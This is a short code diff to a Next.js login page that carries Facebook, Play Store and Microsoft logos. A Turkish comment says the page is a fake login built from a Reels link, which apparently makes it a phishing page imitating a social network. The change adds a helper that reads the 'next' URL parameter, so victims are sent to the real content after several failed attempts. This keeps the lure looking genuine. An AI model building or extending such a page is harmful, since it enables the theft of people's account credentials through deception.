@@ -7,6 +7,14 @@ import Link from 'next/link';
 import facebook from "@/../public/facebook.svg";
 import playstore from "@/../public/playstore.png";
 import microsoft from "@/../public/microsoft.png";
+
+const getNextParam = () => {
+  if (typeof window !== "undefined") {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get("next");
+  }
+  return null;
+};
 // dark:invert
 // reels linki ver reels linki ile sahte login page'i oluştursun bu login page'e giriş yaptığında reels'e yönlendirsin
 export default function LoginPage() {
@@ -39,7 +47,7 @@ export default function LoginPage() {
     } else {
       // Giriş başarısız, 3'ten fazla deneme varsa 'next' parametresine yönlendir
       if (loginCounter + 1 > 3) { // +1, state'in henüz güncellenmediği durumu kapsar
-        const nextUrl = searchParams.get("next");
+        const nextUrl = getNextParam();
         router.push(nextUrl ? nextUrl : "/");
       } else {
         // Hata mesajını göster
